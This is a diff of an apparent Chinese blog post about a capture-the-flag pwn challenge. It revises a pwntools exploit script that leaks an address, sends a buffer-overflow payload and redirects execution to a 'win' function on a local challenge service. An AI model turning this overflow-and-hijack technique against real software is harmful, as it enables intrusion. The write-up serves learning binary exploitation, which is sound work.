@@ -220,25 +220,31 @@ func(badge);
 &lt;p&gt;下面是exp&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;from pwn import *
 
-context.binary = &apos;./pwn&apos;
-p = process([&apos;./libs/ld-linux-x86-64.so.2&apos;, &apos;--library-path&apos;, &apos;./libs&apos;, &apos;./pwn&apos;])
+context.arch = &apos;amd64&apos;
+context.log_level = &apos;info&apos;
 
-p.recvuntil(b&apos;profile: &apos;)
-profile = int(p.recvline().strip(), 16)  
+io = remote(&apos;127.0.0.1&apos;, 63944)
 
-payload = b&apos;A&apos; * 0x30                   
-payload += p64(profile + 0x48)          
-payload += p64(profile + 0x48)        
-payload += p64(profile + 0x50)           
+io.recvuntil(b&apos;profile: &apos;)
+profile = int(io.recvline().strip(), 16)
 
-p.send(payload)
+payload  = b&apos;A&apos; * 0x30
+payload += p64(profile)            
+payload += p64(profile + 0x48)     
+payload += p64(profile + 0x50)    
+assert len(payload) == 0x48
 
-p.recvuntil(b&apos;win: &apos;)
-win = int(p.recvline().strip(), 16)
-p.recvuntil(b&apos;style data: &apos;)
-p.sendline(str(win).encode())            
+io.recvuntil(b&apos;name: &apos;)
+io.send(payload)                 
 
-p.interactive()                
+io.recvuntil(b&apos;win: &apos;)
+win = int(io.recvline().strip(), 16)
+
+io.recvuntil(b&apos;style data: &apos;)
+io.sendline(str(win).encode())
+
+io.recvuntil(b&apos;checking...&apos;)
+io.interactive()
 
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;初学好难搞，以至于将近一天我才好好参悟完一题(实则聊天看网课去了)&lt;/p&gt;
